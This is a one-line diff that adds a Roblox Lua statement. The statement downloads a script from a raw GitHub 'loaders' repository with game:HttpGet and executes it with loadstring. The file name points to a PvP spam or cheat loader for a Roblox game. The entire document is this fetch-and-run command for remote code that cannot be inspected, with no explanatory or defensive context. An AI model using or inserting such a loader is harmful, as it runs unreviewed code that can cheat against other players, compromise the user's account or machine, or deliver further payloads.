@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/rofront-world-pvp-spam7-p51luy5mmdj8gn.lua"))()
